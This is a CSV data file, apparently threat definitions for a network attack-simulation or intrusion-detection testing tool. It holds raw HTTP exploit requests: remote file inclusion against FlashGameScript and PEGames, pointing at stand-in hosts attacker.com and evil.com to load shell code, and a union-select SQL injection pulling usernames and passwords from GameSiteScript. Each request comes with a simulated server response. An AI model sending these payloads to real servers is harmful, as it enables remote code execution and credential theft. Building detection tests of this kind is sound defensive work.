XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿flashgamescript_rfi.xml,FlashGameScript 1.5.4 (index.php func) Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. FlashGameScript is a web application that typically listens on port 80.,HTTP,TCP,GET /index.php?func=http://attacker.com/cmd.txt? HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
flashgamescript_rfi.xml,FlashGameScript 1.5.4 (index.php func) Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. FlashGameScript is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿flashgamescript_rfi_IPv6.xml,FlashGameScript 1.5.4 (index.php func) Remote File Include Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. FlashGameScript is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,GET /index.php?func=http://attacker.com/cmd.txt? HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
flashgamescript_rfi_IPv6.xml,FlashGameScript 1.5.4 (index.php func) Remote File Include Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. FlashGameScript is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿gamesitescript_sql.xml,GameSiteScript <= 3.1 (profile id) Remote SQL Injection Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. GameSiteScript is a web application that typically listens on port 80.,HTTP,TCP,"GET /index.php?params=profile/view/'+union+select+0,username,0,0,0,0,0,0,0,0,0,0,0,0,password,0,0,0,0,0,0,0,0+from+members+where+id='1 HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]"
gamesitescript_sql.xml,GameSiteScript <= 3.1 (profile id) Remote SQL Injection Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. GameSiteScript is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿gamesitescript_sql_IPv6.xml,GameSiteScript <= 3.1 (profile id) Remote SQL Injection Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. GameSiteScript is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /index.php?params=profile/view/'+union+select+0,username,0,0,0,0,0,0,0,0,0,0,0,0,password,0,0,0,0,0,0,0,0+from+members+where+id='1 HTTP/1.0[[0D 0A ]]Host: www.site.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]"
gamesitescript_sql_IPv6.xml,GameSiteScript <= 3.1 (profile id) Remote SQL Injection Vulnerability (IPv6 Version),This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. GameSiteScript is a web application that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿pegames_rfi.xml,PEGames Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. PEGame is a web application that typically listens on port 80.,HTTP,TCP,GET /Index.php?abs_url=http://evil.com/shell.txt? HTTP/1.0[[0D 0A ]]Host: example.com[[0D 0A ]]User-Agent: Googlebot/2.1[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
pegames_rfi.xml,PEGames Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. PEGame is a web application that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
